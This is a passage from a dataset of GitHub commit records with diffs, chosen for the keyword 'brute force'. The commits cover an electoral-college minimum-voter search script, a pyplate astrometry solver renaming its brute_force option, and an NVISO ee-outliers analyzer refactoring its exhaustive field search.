algorithm_1(states, population, electoral_votes)\n     print(fraction, number_checked, best_combination)\n     time_taken = time.time() - now\n-    print(f'time for {number_to_consider} states by algorithm 1 {time_taken}\\n')\n+    print(f'time for {number_to_consider} states by algorithm 1: {time_taken}\\n')\n     time_algorithm_1.append(time_taken)\n     number_checked_algorithm_1.append(number_checked)\n \n-df = pd.DataFrame(columns=['number of states', 'number_checked_brute_force', 'time_brute_force', 'number_checked_algorithm_1', 'time_algorithm_1'])\n+df = pd.DataFrame(columns=['number of states', 'number_checked_brute_force', 'time_brute_force',\n+                           'number_checked_algorithm_1', 'time_algorithm_1'])\n df['number of states'] = numbers_to_consider\n df['number_checked_brute_force'].iloc[0:len(number_checked_brute)] = number_checked_brute\n df['time_brute_force'].iloc[0:len(time_brute)] = time_brute\n","add":3,"remove":2,"filename":"\/main.py","badparts":["    print(f'time for {number_to_consider} states by algorithm 1 {time_taken}\\n')","df = pd.DataFrame(columns=['number of states', 'number_checked_brute_force', 'time_brute_force', 'number_checked_algorithm_1', 'time_algorithm_1'])"],"goodparts":["    print(f'time for {number_to_consider} states by algorithm 1: {time_taken}\\n')","df = pd.DataFrame(columns=['number of states', 'number_checked_brute_force', 'time_brute_force',","                           'number_checked_algorithm_1', 'time_algorithm_1'])"]}],"source":"\nfrom input_data.import_inputs import population, electoral_votes import random import itertools import numpy as np import time import pandas as pd from collections import Counter def brute_force(states, population, electoral_votes): number_checked=0 total_electoral_votes=sum([electoral_votes[state] for state in states]) total_voters=sum([population[state] for state in states]) min_voters_won=total_voters best_combination=None for outcome in itertools.product([True, False], repeat=len(states)): number_checked +=1 electoral_votes_won=sum([electoral_votes[states[ii]] for ii in range(len(states)) if outcome[ii]]) if electoral_votes_won > total_electoral_votes \/ 2: voters_won=sum([population[states[ii]] \/ 2 for ii in range(len(states)) if outcome[ii]]) if min_voters_won > voters_won: min_voters_won=voters_won best_combination=[states[ii] for ii in range(len(states)) if outcome[ii]] best_combination.sort() return min_voters_won\/total_voters, number_checked, best_combination def generate_order(states, population, electoral_votes): state_dict=dict() for state in states: if electoral_votes[state] in state_dict: state_dict[electoral_votes[state]].append(state) else: state_dict[electoral_votes[state]]=[state] for electoral_votes_amount, states_at_that_amount in state_dict.items(): state_populations=[population[state] for state in states_at_that_amount] order=np.argsort(state_populations) state_dict[electoral_votes_amount]=list(np.array(states_at_that_amount)[order]) return state_dict def algorithm_1(states, population, electoral_votes): \"\"\" group states by number of ec votes \"\"\" state_dict=generate_order(states, population, electoral_votes) electoral_votes_amounts=list(state_dict.keys()) electoral_votes_amounts.sort() multiplicities=[len(state_dict[electoral_votes_amount]) for electoral_votes_amount in electoral_votes_amounts] total_electoral_votes=sum([electoral_votes[state] for state in states]) total_voters=sum([population[state] for state in states]) min_voters_won=total_voters best_combination=None number_checked=0 for outcome in itertools.product(*[range(multiplicity +1) for multiplicity in multiplicities]): number_checked +=1 electoral_votes_won=np.dot(outcome, electoral_votes_amounts) if electoral_votes_won > total_electoral_votes \/ 2: states_won=[item for electoral_votes_amount, multiplicity in zip(electoral_votes_amounts, outcome) for item in state_dict[electoral_votes_amount][0:multiplicity]] voters_won=sum([population[state] \/ 2 for state in states_won]) if min_voters_won > voters_won: min_voters_won=voters_won best_combination=states_won best_combination.sort() return min_voters_won \/ total_voters, number_checked, best_combination state_list=list(population.keys()) time_brute=list() number_checked_brute=list() time_algorithm_1=list() number_checked_algorithm_1=list() numbers_to_consider=[5, 10, 15, 20, 25, 30, 50] for number_to_consider in numbers_to_consider: states=random.sample(state_list, number_to_consider) if number_to_consider <=20: now=time.time() fraction, number_checked, best_combination=brute_force(states, population, electoral_votes) print(fraction, number_checked, best_combination) time_taken=time.time() -now print(f'time for{number_to_consider} states by brute force{time_taken}\\n') time_brute.append(time_taken) number_checked_brute.append(number_checked) now=time.time() fraction, number_checked, best_combination=algorithm_1(states, population, electoral_votes) print(fraction, number_checked, best_combination) time_taken=time.time() -now print(f'time for{number_to_consider} states by algorithm 1{time_taken}\\n') time_algorithm_1.append(time_taken) number_checked_algorithm_1.append(number_checked) df=pd.DataFrame(columns=['number of states', 'number_checked_brute_force', 'time_brute_force', 'number_checked_algorithm_1', 'time_algorithm_1']) df['number of states']=numbers_to_consider df['number_checked_brute_force'].iloc[0:len(number_checked_brute)]=number_checked_brute df['time_brute_force'].iloc[0:len(time_brute)]=time_brute df['number_checked_algorithm_1']=number_checked_algorithm_1 df['time_algorithm_1']=time_algorithm_1 pd.set_option(\"display.max_rows\", None, \"display.max_columns\", None) print(df) df.to_clipboard() ","sourceWithComments":"from input_data.import_inputs import population, electoral_votes\nimport random\nimport itertools\nimport numpy as np\nimport time\nimport pandas as pd\nfrom collections import Counter\n\n\n\n\ndef brute_force(states, population, electoral_votes):\n    number_checked = 0\n    # vote_results = list()\n    total_electoral_votes = sum([electoral_votes[state] for state in states])\n    total_voters = sum([population[state] for state in states])\n    min_voters_won = total_voters\n    best_combination = None\n    for outcome in itertools.product([True, False], repeat=len(states)):\n        number_checked += 1\n        electoral_votes_won = sum([electoral_votes[states[ii]] for ii in range(len(states)) if outcome[ii]])\n        if electoral_votes_won > total_electoral_votes \/ 2:\n            voters_won = sum([population[states[ii]] \/ 2 for ii in range(len(states)) if outcome[ii]])\n            # vote_results.append([outcome, voters_won \/ total_voters])\n            if min_voters_won > voters_won:\n                min_voters_won = voters_won\n                best_combination = [states[ii] for ii in range(len(states)) if outcome[ii]]\n    best_combination.sort()\n    return min_voters_won\/total_voters, number_checked, best_combination\n\ndef generate_order(states, population, electoral_votes):\n    state_dict = dict()\n    for state in states:\n        if electoral_votes[state] in state_dict:\n            state_dict[electoral_votes[state]].append(state)\n        else:\n            state_dict[electoral_votes[state]] = [state]\n    for electoral_votes_amount, states_at_that_amount in state_dict.items():\n        state_populations = [population[state] for state in states_at_that_amount]\n        order = np.argsort(state_populations)\n        state_dict[electoral_votes_amount] = list(np.array(states_at_that_amount)[order])\n    return state_dict\n\ndef algorithm_1(states, population, electoral_votes):\n    \"\"\"\n    group states by number of ec votes\n\n    \"\"\"\n    state_dict = generate_order(states, population, electoral_votes)\n    electoral_votes_amounts = list(state_dict.keys())\n    electoral_votes_amounts.sort()\n    multiplicities = [len(state_dict[electoral_votes_amount]) for electoral_votes_amount in electoral_votes_amounts]\n\n    total_electoral_votes = sum([electoral_votes[state] for state in states])\n    total_voters = sum([population[state] for state in states])\n    min_voters_won = total_voters\n    best_combination = None\n\n    number_checked = 0\n    for outcome in itertools.product(*[range(multiplicity + 1) for multiplicity in multiplicities]):\n        number_checked += 1\n        electoral_votes_won = np.dot(outcome, electoral_votes_amounts)\n        if electoral_votes_won > total_electoral_votes \/ 2:\n            # states_won = [state_dict[electoral_votes_amount][0:multiplicity] for electoral_votes_amount, multiplicity in\n            #               zip(electoral_votes_amounts, outcome)]\n            # states_won = [item for sublist in states_won for item in sublist]\n            states_won = [item for electoral_votes_amount, multiplicity in zip(electoral_votes_amounts, outcome)\n                          for item in state_dict[electoral_votes_amount][0:multiplicity]]\n\n            voters_won = sum([population[state] \/ 2 for state in states_won])\n            if min_voters_won > voters_won:\n                min_voters_won = voters_won\n                best_combination = states_won\n    best_combination.sort()\n    return min_voters_won \/ total_voters, number_checked, best_combination\n\n\nstate_list = list(population.keys())\n\ntime_brute = list()\nnumber_checked_brute = list()\ntime_algorithm_1 = list()\nnumber_checked_algorithm_1 = list()\n\nnumbers_to_consider = [5, 10, 15, 20, 25, 30, 50]\nfor number_to_consider in numbers_to_consider:\n\n    states = random.sample(state_list, number_to_consider)\n    if number_to_consider <= 20:\n        now = time.time()\n        fraction, number_checked, best_combination = brute_force(states, population, electoral_votes)\n        print(fraction, number_checked, best_combination)\n        time_taken = time.time() - now\n        print(f'time for {number_to_consider} states by brute force {time_taken}\\n')\n\n        time_brute.append(time_taken)\n        number_checked_brute.append(number_checked)\n\n    now = time.time()\n    fraction, number_checked, best_combination = algorithm_1(states, population, electoral_votes)\n    print(fraction, number_checked, best_combination)\n    time_taken = time.time() - now\n    print(f'time for {number_to_consider} states by algorithm 1 {time_taken}\\n')\n    time_algorithm_1.append(time_taken)\n    number_checked_algorithm_1.append(number_checked)\n\ndf = pd.DataFrame(columns=['number of states', 'number_checked_brute_force', 'time_brute_force', 'number_checked_algorithm_1', 'time_algorithm_1'])\ndf['number of states'] = numbers_to_consider\ndf['number_checked_brute_force'].iloc[0:len(number_checked_brute)] = number_checked_brute\ndf['time_brute_force'].iloc[0:len(time_brute)] = time_brute\ndf['number_checked_algorithm_1'] = number_checked_algorithm_1\ndf['time_algorithm_1'] = time_algorithm_1\npd.set_option(\"display.max_rows\", None, \"display.max_columns\", None)\nprint(df)\ndf.to_clipboard()\n"}},"msg":"brute force and first algo written, profiled, improved"}},"https:\/\/github.com\/astrotuvi\/pyplate":{"b082970f3795cd1ab53d5b5949b3af083972f18d":{"url":"https:\/\/api.github.com\/repos\/astrotuvi\/pyplate\/commits\/b082970f3795cd1ab53d5b5949b3af083972f18d","html_url":"https:\/\/github.com\/astrotuvi\/pyplate\/commit\/b082970f3795cd1ab53d5b5949b3af083972f18d","message":"Widened selection of sources for astrometric solution from 6 to 8 annular bins; renamed brute_force to use_force and allow_brute_force to allow_force; improved selection of sources when use_force is specified","sha":"b082970f3795cd1ab53d5b5949b3af083972f18d","keyword":"brute force improve","diff":"diff --git a\/pyplate\/_version.py b\/pyplate\/_version.py\nindex 913a6d9..8aefae6 100644\n--- a\/pyplate\/_version.py\n+++ b\/pyplate\/_version.py\n@@ -1 +1 @@\n-__version__ = '4.0.dev21'\n+__version__ = '4.0.dev22'\ndiff --git a\/pyplate\/process\/solve.py b\/pyplate\/process\/solve.py\nindex 0a60f0e..d1c467f 100644\n--- a\/pyplate\/process\/solve.py\n+++ b\/pyplate\/process\/solve.py\n@@ -729,7 +729,7 @@ def __init__(self, filename, archive_id=None):\n         self.max_model_sources = 10000\n         self.sip = 3\n         self.skip_bright = 10\n-        self.allow_brute_force = False\n+        self.allow_force = False\n         self.distort = 3\n         self.subfield_distort = 1\n         self.max_recursion_depth = 5\n@@ -909,7 +909,7 @@ def assign_conf(self, conf):\n                 pass\n \n         for attr in ['use_filter', 'use_psf', 'circular_film',\n-                     'allow_brute_force']:\n+                     'allow_force']:\n             try:\n                 setattr(self, attr, conf.getboolean('Solve', attr))\n             except ValueError:\n@@ -1398,7 +1398,7 @@ def solve_plate(self, plate_epoch=None, sip=None, skip_bright=None):\n         else:\n             bclean = self.sources['flag_clean'] == 1\n \n-        indclean = np.where(bclean & (self.sources['annular_bin'] <= 6))[0]\n+        indclean = np.where(bclean & (self.sources['annular_bin'] <= 8))[0]\n         sb = skip_bright\n         indsort = np.argsort(self.sources[indclean]['mag_auto'])[sb:sb+num_keep]\n         indsel = indclean[indsort]\n@@ -1439,22 +1439,22 @@ def solve_plate(self, plate_epoch=None, sip=None, skip_bright=None):\n         fn_xy = os.path.join(self.scratch_dir, '{}.xy'.format(self.basefn))\n         xycat.write(fn_xy, format='fits', overwrite=True)\n \n-        brute_force = False\n+        use_force = False\n \n         # Repeat finding astrometric solutions until none is found\n         while True:\n             solution, astref_table = self.find_astrometric_solution(ref_year=plate_year, sip=sip,\n-                                                                    brute_force=brute_force)\n+                                                                    use_force=use_force)\n \n             if solution is None:\n-                if (brute_force or self.num_solutions > 0 or\n-                    not self.allow_brute_force):\n+                if (use_force or self.num_solutions > 0 or\n+                    not self.allow_force):\n                     break\n                 else:\n-                    brute_force = True\n+                    use_force = True\n                     continue\n             else:\n-                brute_force = False\n+                use_force = False\n \n             unique_solution = True\n \n@@ -1543,7 +1543,7 @@ def solve_plate(self, plate_epoch=None, sip=None, skip_bright=None):\n         return plate_solution\n \n     def find_astrometric_solution(self, ref_year=None, sip=None,\n-                                  brute_force=False):\n+                                  use_force=False):\n         \"\"\"\n         Solve astrometry for a list of sources.\n \n@@ -1574,9 +1574,8 @@ def find_astrometric_solution(self, ref_year=None, sip=None,\n         self.log.write('Number of remaining solutions: {:d}'\n                        .format(num_remain_exp), level=4, event=32)\n \n-        if brute_force:\n-            self.log.write('Using brute force to find solution',\n-                           level=4, event=32)\n+        if use_force:\n+            self.log.write('Using force to find solution', level=4, event=32)\n \n         # Current solution sequence number\n         solution_seq = self.num_solutions + self.num_duplicate_solutions + 1\n@@ -1586,7 +1585,7 @@ def find_astrometric_solution(self, ref_year=None, sip=None,\n         if (self.exp_numbers is not None\n             and len(self.exp_numbers) > 4\n             and self.exp_numbers.max() > self.num_solutions\n-            and brute_force == False):\n+            and use_force == False):\n             self.log.write('Selecting sources that match the exposure number '\n                            '{:d}'.format(solution_seq),\n                            level=4, event=32)\n@@ -1597,7 +1596,7 @@ def find_astrometric_solution(self, ref_year=None, sip=None,\n         # If number of remaining exposures is larger than 2, then\n         # select sources that have two nearest neighbours within 90-degree\n         # angle\n-        elif num_remain_exp > 2 and brute_force == False:\n+        elif num_remain_exp > 2 and use_force == False:\n             self.log.write('Selecting sources that have two nearest neighbours '\n                            'within 90-degree angle', level=4, event=32)\n             coords = np.empty((num_astrom_sources, 2))\n@@ -1669,8 +1668,34 @@ def find_astrometric_solution(self, ref_year=None, sip=None,\n             t['dy2'] = y2[indmask] - y0[indmask]\n             t['label'] = labels\n             basefn_solution = '{}-{:02d}'.format(self.basefn, solution_seq)\n-            fn_out = os.path.join(self.scratch_dir, '{}_dxy.fits'.format(basefn_solution))\n+            fn_out = os.path.join(self.scratch_dir,\n+                                  '{}_dxy.fits'.format(basefn_solution))\n             t.write(fn_out, format='fits', overwrite=True)\n+\n+        # If use_force is True, then select stars that have been classified\n+        # as true sources, regardless of the number of exposures.\n+        # Also, narrow the selection to annular bins 1-6.\n+        elif use_force == True:\n+            if np.isnan(self.astrom_sources['model_prediction']).sum() == 0:\n+                btrue = self.astrom_sources['model_prediction'] > 0.9\n+\n+                # If less than 5 sources are classified as true sources,\n+                # use all\n+                if btrue.sum() < 5:\n+                    btrue = np.full(len(self.astrom_sources), True)\n+            else:\n+                btrue = np.full(len(self.astrom_sources), True)\n+\n+            bselect = btrue & (self.astrom_sources['annular_bin'] <= 6)\n+\n+            # If less than 5 sources remain, select all\n+            if bselect.sum() < 5:\n+                bselect = np.full(len(self.astrom_sources), True)\n+\n+            use_sources = self.astrom_sources[bselect]\n+            num_use_sources = bselect.sum()\n+\n+        # In other cases, use all sources\n         else:\n             use_sources = self.astrom_sources\n             num_use_sources = num_astrom_sources\n@@ -1743,7 +1768,7 @@ def find_astrometric_solution(self, ref_year=None, sip=None,\n \n         if num_remain_exp > 0:\n             # Higher cpu limit for the first solution\n-            if brute_force:\n+            if use_force:\n                 cmd += ' --cpulimit 600'\n             elif self.num_solutions == 0:\n                 cmd += ' --cpulimit 300'\n","files":{"\/pyplate\/_version.py":{"changes":[{"diff":"\n-__version__ = '4.0.dev21'\n+__version__ = '4.0.dev22'","add":1,"remove":1,"filename":"\/pyplate\/_version.py","badparts":["__version__ = '4.0.dev21'"],"goodparts":["__version__ = '4.0.dev22'"]}],"source":"\n__version__='4.0.dev21' ","sourceWithComments":"__version__ = '4.0.dev21'\n"},"\/pyplate\/process\/solve.py":{"changes":[{"diff":"\n         self.max_model_sources = 10000\n         self.sip = 3\n         self.skip_bright = 10\n-        self.allow_brute_force = False\n+        self.allow_force = False\n         self.distort = 3\n         self.subfield_distort = 1\n         self.max_recursion_depth = 5\n","add":1,"remove":1,"filename":"\/pyplate\/process\/solve.py","badparts":["        self.allow_brute_force = False"],"goodparts":["        self.allow_force = False"]},{"diff":"\n                 pass\n \n         for attr in ['use_filter', 'use_psf', 'circular_film',\n-                     'allow_brute_force']:\n+                     'allow_force']:\n             try:\n                 setattr(self, attr, conf.getboolean('Solve', attr))\n             except ValueError:\n","add":1,"remove":1,"filename":"\/pyplate\/process\/solve.py","badparts":["                     'allow_brute_force']:"],"goodparts":["                     'allow_force']:"]},{"diff":"\n         else:\n             bclean = self.sources['flag_clean'] == 1\n \n-        indclean = np.where(bclean & (self.sources['annular_bin'] <= 6))[0]\n+        indclean = np.where(bclean & (self.sources['annular_bin'] <= 8))[0]\n         sb = skip_bright\n         indsort = np.argsort(self.sources[indclean]['mag_auto'])[sb:sb+num_keep]\n         indsel = indclean[indsort]\n","add":1,"remove":1,"filename":"\/pyplate\/process\/solve.py","badparts":["        indclean = np.where(bclean & (self.sources['annular_bin'] <= 6))[0]"],"goodparts":["        indclean = np.where(bclean & (self.sources['annular_bin'] <= 8))[0]"]},{"diff":"\n         fn_xy = os.path.join(self.scratch_dir, '{}.xy'.format(self.basefn))\n         xycat.write(fn_xy, format='fits', overwrite=True)\n \n-        brute_force = False\n+        use_force = False\n \n         # Repeat finding astrometric solutions until none is found\n         while True:\n             solution, astref_table = self.find_astrometric_solution(ref_year=plate_year, sip=sip,\n-                                                                    brute_force=brute_force)\n+                                                                    use_force=use_force)\n \n             if solution is None:\n-                if (brute_force or self.num_solutions > 0 or\n-                    not self.allow_brute_force):\n+                if (use_force or self.num_solutions > 0 or\n+                    not self.allow_force):\n                     break\n                 else:\n-                    brute_force = True\n+                    use_force = True\n                     continue\n             else:\n-                brute_force = False\n+                use_force = False\n \n             unique_solution = True\n \n","add":6,"remove":6,"filename":"\/pyplate\/process\/solve.py","badparts":["        brute_force = False","                                                                    brute_force=brute_force)","                if (brute_force or self.num_solutions > 0 or","                    not self.allow_brute_force):","                    brute_force = True","                brute_force = False"],"goodparts":["        use_force = False","                                                                    use_force=use_force)","                if (use_force or self.num_solutions > 0 or","                    not self.allow_force):","                    use_force = True","                use_force = False"]},{"diff":"\n         return plate_solution\n \n     def find_astrometric_solution(self, ref_year=None, sip=None,\n-                                  brute_force=False):\n+                                  use_force=False):\n         \"\"\"\n         Solve astrometry for a list of sources.\n \n","add":1,"remove":1,"filename":"\/pyplate\/process\/solve.py","badparts":["                                  brute_force=False):"],"goodparts":["                                  use_force=False):"]},{"diff":"\n         self.log.write('Number of remaining solutions: {:d}'\n                        .format(num_remain_exp), level=4, event=32)\n \n-        if brute_force:\n-            self.log.write('Using brute force to find solution',\n-                           level=4, event=32)\n+        if use_force:\n+            self.log.write('Using force to find solution', level=4, event=32)\n \n         # Current solution sequence number\n         solution_seq = self.num_solutions + self.num_duplicate_solutions + 1\n","add":2,"remove":3,"filename":"\/pyplate\/process\/solve.py","badparts":["        if brute_force:","            self.log.write('Using brute force to find solution',","                           level=4, event=32)"],"goodparts":["        if use_force:","            self.log.write('Using force to find solution', level=4, event=32)"]},{"diff":"\n         if (self.exp_numbers is not None\n             and len(self.exp_numbers) > 4\n             and self.exp_numbers.max() > self.num_solutions\n-            and brute_force == False):\n+            and use_force == False):\n             self.log.write('Selecting sources that match the exposure number '\n                            '{:d}'.format(solution_seq),\n                            level=4, event=32)\n","add":1,"remove":1,"filename":"\/pyplate\/process\/solve.py","badparts":["            and brute_force == False):"],"goodparts":["            and use_force == False):"]},{"diff":"\n         # If number of remaining exposures is larger than 2, then\n         # select sources that have two nearest neighbours within 90-degree\n         # angle\n-        elif num_remain_exp > 2 and brute_force == False:\n+        elif num_remain_exp > 2 and use_force == False:\n             self.log.write('Selecting sources that have two nearest neighbours '\n                            'within 90-degree angle', level=4, event=32)\n             coords = np.empty((num_astrom_sources, 2))\n","add":1,"remove":1,"filename":"\/pyplate\/process\/solve.py","badparts":["        elif num_remain_exp > 2 and brute_force == False:"],"goodparts":["        elif num_remain_exp > 2 and use_force == False:"]},{"diff":"\n             t['dy2'] = y2[indmask] - y0[indmask]\n             t['label'] = labels\n             basefn_solution = '{}-{:02d}'.format(self.basefn, solution_seq)\n-            fn_out = os.path.join(self.scratch_dir, '{}_dxy.fits'.format(basefn_solution))\n+            fn_out = os.path.join(self.scratch_dir,\n+                                  '{}_dxy.fits'.format(basefn_solution))\n             t.write(fn_out, format='fits', overwrite=True)\n+\n+        # If use_force is True, then select stars that have been classified\n+        # as true sources, regardless of the number of exposures.\n+        # Also, narrow the selection to annular bins 1-6.\n+        elif use_force == True:\n+            if np.isnan(self.astrom_sources['model_prediction']).sum() == 0:\n+                btrue = self.astrom_sources['model_prediction'] > 0.9\n+\n+                # If less than 5 sources are classified as true sources,\n+                # use all\n+                if btrue.sum() < 5:\n+                    btrue = np.full(len(self.astrom_sources), True)\n+            else:\n+                btrue = np.full(len(self.astrom_sources), True)\n+\n+            bselect = btrue & (self.astrom_sources['annular_bin'] <= 6)\n+\n+            # If less than 5 sources remain, select all\n+            if bselect.sum() < 5:\n+                bselect = np.full(len(self.astrom_sources), True)\n+\n+            use_sources = self.astrom_sources[bselect]\n+            num_use_sources = bselect.sum()\n+\n+        # In other cases, use all sources\n         else:\n             use_sources = self.astrom_sources\n             num_use_sources = num_astrom_sources\n","add":27,"remove":1,"filename":"\/pyplate\/process\/solve.py","badparts":["            fn_out = os.path.join(self.scratch_dir, '{}_dxy.fits'.format(basefn_solution))"],"goodparts":["            fn_out = os.path.join(self.scratch_dir,","                                  '{}_dxy.fits'.format(basefn_solution))","        elif use_force == True:","            if np.isnan(self.astrom_sources['model_prediction']).sum() == 0:","                btrue = self.astrom_sources['model_prediction'] > 0.9","                if btrue.sum() < 5:","                    btrue = np.full(len(self.astrom_sources), True)","            else:","                btrue = np.full(len(self.astrom_sources), True)","            bselect = btrue & (self.astrom_sources['annular_bin'] <= 6)","            if bselect.sum() < 5:","                bselect = np.full(len(self.astrom_sources), True)","            use_sources = self.astrom_sources[bselect]","            num_use_sources = bselect.sum()"]},{"diff":"\n \n         if num_remain_exp > 0:\n             # Higher cpu limit for the first solution\n-            if brute_force:\n+            if use_force:\n                 cmd += ' --cpulimit 600'\n             elif self.num_solutions == 0:\n                 cmd += ' --cpulimit 300'\n","add":1,"remove":1,"filename":"\/pyplate\/process\/solve.py","badparts":["            if brute_force:"],"goodparts":["            if use_force:"]}]}},"msg":"Widened selection of sources for astrometric solution from 6 to 8 annular bins; renamed brute_force to use_force and allow_brute_force to allow_force; improved selection of sources when use_force is specified"}},"https:\/\/github.com\/NVISOsecurity\/ee-outliers":{"3a8ff83bdfb6a6519533252f2421a4074e5f7535":{"url":"https:\/\/api.github.com\/repos\/NVISOsecurity\/ee-outliers\/commits\/3a8ff83bdfb6a6519533252f2421a4074e5f7535","html_url":"https:\/\/github.com\/NVISOsecurity\/ee-outliers\/commit\/3a8ff83bdfb6a6519533252f2421a4074e5f7535","message":"improved brute forcing model","sha":"3a8ff83bdfb6a6519533252f2421a4074e5f7535","keyword":"brute force improve","diff":"diff --git a\/app\/analyzers\/terms.py b\/app\/analyzers\/terms.py\nindex 4b907e64..37c3ec53 100644\n--- a\/app\/analyzers\/terms.py\n+++ b\/app\/analyzers\/terms.py\n@@ -12,59 +12,26 @@ class TermsAnalyzer(Analyzer):\n     def evaluate_model(self):\n         self.extract_additional_model_settings()\n \n-        if \"*\" in self.model_settings[\"target\"]:\n-            brute_force = False\n-\n+        if self.model_settings[\"brute_force_target\"]:\n             logging.logger.warning(\"running terms model in brute force mode, could take a long time!\")\n+            target_fields_to_brute_force = self.calculate_target_fields_to_brute_force()\n \n-            search_query = es.filter_by_query_string(self.model_settings[\"es_query_filter\"])\n-            batch_size = settings.config.getint(\"terms\", \"terms_batch_eval_size\")\n-\n-            self.total_events = es.count_documents(search_query=search_query)\n-            logging.init_ticker(total_steps=min(self.total_events, batch_size), desc=self.model_name + \" - extracting brute force fields\")\n-\n-            field_names = set()\n-            num_docs_processed = 0\n-            for doc in es.scan(search_query=search_query):\n-                logging.tick()\n-                fields = es.extract_fields_from_document(doc, extract_derived_fields=self.model_settings[\"use_derived_fields\"])\n-                fields = helpers.utils.flatten_dict(fields)\n-\n-                # skip all fields that are related to outliers, we don't want to brute force them\n-                for field_name in list(fields.keys()):  # create list instead of iterator so we can mutate the dictionary when iterating\n-                    if field_name.startswith('outliers.'):\n-                        logging.logger.debug(\"not brute forcing outliers field \" + str(field_name))\n-                        fields.pop(field_name)\n-\n-                field_names.update(fields.keys())\n-\n-                # only process a single batch of events in order to decide which fields to brute force\n-                if num_docs_processed == batch_size:\n-                    break\n-                else:\n-                    num_docs_processed += 1\n-\n-            logging.logger.info(\"going to brute force \" + str(len(field_names)) + \" fields\")\n-            for field_name in field_names:\n-                # only brute force nested fields, so not the top level fields such as timestamp, deployment name, etc.\n-                if \".\" in field_name:\n-                    self.model_settings[\"target\"] = list([field_name])\n-                    self.model_settings[\"brute_forced_field\"] = field_name  # so it can be added to the outlier events automatically\n-                    brute_force = True\n-\n+            for target_field in target_fields_to_brute_force:\n+                self.model_settings[\"brute_forced_field\"] = target_field\n+                search_query = es.filter_by_query_string(self.model_settings[\"es_query_filter\"] + \" AND _exists_:\" + self.model_settings[\"brute_forced_field\"])\n+                self.evaluate_target(target=[self.model_settings[\"brute_forced_field\"]], search_query=search_query, brute_force=True)\n         else:\n-            brute_force = False\n-\n-        if brute_force:\n-            search_query = es.filter_by_query_string(self.model_settings[\"es_query_filter\"] + \" AND _exists_:\" + self.model_settings[\"brute_forced_field\"])\n-        else:\n-            search_query = es.filter_by_query_string(self.model_settings[\"es_query_filter\"])\n+            self.evaluate_target(target=self.model_settings[\"target\"], search_query=es.filter_by_query_string(self.model_settings[\"es_query_filter\"]), brute_force=False)\n \n+    def evaluate_target(self, target, search_query, brute_force=False):\n         self.total_events = es.count_documents(search_query=search_query)\n \n         logging.print_analysis_intro(event_type=\"evaluating \" + self.model_name, total_events=self.total_events)\n         logging.init_ticker(total_steps=self.total_events, desc=self.model_name + \" - evaluating terms model\")\n \n+        if brute_force:\n+            logging.logger.info(\"brute forcing field %s\", str(target[0]))\n+\n         eval_terms_array = defaultdict()\n         total_terms_added = 0\n \n@@ -74,7 +41,7 @@ def evaluate_model(self):\n             fields = es.extract_fields_from_document(doc, extract_derived_fields=self.model_settings[\"use_derived_fields\"])\n \n             try:\n-                target_sentences = helpers.utils.flatten_fields_into_sentences(fields=fields, sentence_format=self.model_settings[\"target\"])\n+                target_sentences = helpers.utils.flatten_fields_into_sentences(fields=fields, sentence_format=target)\n                 aggregator_sentences = helpers.utils.flatten_fields_into_sentences(fields=fields, sentence_format=self.model_settings[\"aggregator\"])\n                 will_process_doc = True\n             except (KeyError, TypeError):\n@@ -124,8 +91,47 @@ def evaluate_model(self):\n \n         self.print_analysis_summary()\n \n+    def calculate_target_fields_to_brute_force(self):\n+        search_query = es.filter_by_query_string(self.model_settings[\"es_query_filter\"])\n+        batch_size = settings.config.getint(\"terms\", \"terms_batch_eval_size\")\n+\n+        self.total_events = es.count_documents(search_query=search_query)\n+        logging.init_ticker(total_steps=min(self.total_events, batch_size), desc=self.model_name + \" - extracting brute force fields\")\n+\n+        field_names_to_brute_force = set()\n+        num_docs_processed = 0\n+        for doc in es.scan(search_query=search_query):\n+            logging.tick()\n+            fields = es.extract_fields_from_document(doc, extract_derived_fields=self.model_settings[\"use_derived_fields\"])\n+            fields = helpers.utils.flatten_dict(fields)\n+\n+            for field_name in list(fields.keys()):  # create list instead of iterator so we can mutate the dictionary when iterating\n+                # skip all fields that are related to outliers, we don't want to brute force them\n+                if field_name.startswith('outliers.'):\n+                    logging.logger.debug(\"not brute forcing outliers field \" + str(field_name))\n+                    continue\n+\n+                # only brute force nested fields, so not the top level fields such as timestamp, deployment name, etc.\n+                if \".\" in field_name:\n+                    field_names_to_brute_force.add(field_name)\n+\n+            # only process a single batch of events in order to decide which fields to brute force\n+            if num_docs_processed == batch_size:\n+                break\n+            else:\n+                num_docs_processed += 1\n+\n+        logging.logger.info(\"going to brute force \" + str(len(field_names_to_brute_force)) + \" fields\")\n+        return field_names_to_brute_force\n+\n     def extract_additional_model_settings(self):\n         self.model_settings[\"target\"] = settings.config.get(self.config_section_name, \"target\").replace(' ', '').split(\",\")  # remove unnecessary whitespace, split fields\n+\n+        if \"*\" in self.model_settings[\"target\"]:\n+            self.model_settings[\"brute_force_target\"] = True\n+        else:\n+            self.model_settings[\"brute_force_target\"] = False\n+\n         self.model_settings[\"aggregator\"] = settings.config.get(self.config_section_name, \"aggregator\").replace(' ', '').split(\",\")  # remove unnecessary whitespace, split fields\n \n         self.model_settings[\"trigger_on\"] = settings.config.get(self.config_section_name, \"trigger_on\")\n","files":{"\/app\/analyzers\/terms.py":{"changes":[{"diff":"\n     def evaluate_model(self):\n         self.extract_additional_model_settings()\n \n-        if \"*\" in self.model_settings[\"target\"]:\n-            brute_force = False\n-\n+        if self.model_settings[\"brute_force_target\"]:\n             logging.logger.warning(\"running terms model in brute force mode, could take a long time!\")\n+            target_fields_to_brute_force = self.calculate_target_fields_to_brute_force()\n \n-            search_query = es.filter_by_query_string(self.model_settings[\"es_query_filter\"])\n-            batch_size = settings.config.getint(\"terms\", \"terms_batch_eval_size\")\n-\n-            self.total_events = es.count_documents(search_query=search_query)\n-            logging.init_ticker(total_steps=min(self.total_events, batch_size), desc=self.model_name + \" - extracting brute force fields\")\n-\n-            field_names = set()\n-            num_docs_processed = 0\n-            for doc in es.scan(search_query=search_query):\n-                logging.tick()\n-                fields = es.extract_fields_from_document(doc, extract_derived_fields=self.model_settings[\"use_derived_fields\"])\n-                fields = helpers.utils.flatten_dict(fields)\n-\n-                # skip all fields that are related to outliers, we don't want to brute force them\n-                for field_name in list(fields.keys()):  # create list instead of iterator so we can mutate the dictionary when iterating\n-                    if field_name.startswith('outliers.'):\n-                        logging.logger.debug(\"not brute forcing outliers field \" + str(field_name))\n-                        fields.pop(field_name)\n-\n-                field_names.update(fields.keys())\n-\n-                # only process a single batch of events in order to decide which fields to brute force\n-                if num_docs_processed == batch_size:\n-                    break\n-                else:\n-                    num_docs_processed += 1\n-\n-            logging.logger.info(\"going to brute force \" + str(len(field_names)) + \" fields\")\n-            for field_name in field_names:\n-                # only brute force nested fields, so not the top level fields such as 